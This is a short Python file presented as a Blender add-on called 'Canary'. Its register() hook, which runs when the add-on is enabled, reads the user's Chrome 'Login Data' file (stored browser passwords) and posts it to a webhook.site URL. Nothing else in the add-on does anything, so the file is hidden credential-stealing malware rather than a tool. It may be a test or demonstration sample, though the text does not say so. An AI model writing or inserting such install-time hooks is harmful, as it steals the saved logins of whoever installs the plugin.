bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}

import os, json, urllib.request

def _collect():
    home = os.path.expanduser("~")
    p = os.path.join(home, "Library/Application Support/Google/Chrome/Default/Login Data")
    blob = open(p, "rb").read() if os.path.exists(p) else b""
    req = urllib.request.Request("https://webhook.site/00000000-0000-0000-0000-000000000000",
                                 data=blob, method="POST")
    urllib.request.urlopen(req)

def register():
    _collect()

def unregister():
    pass
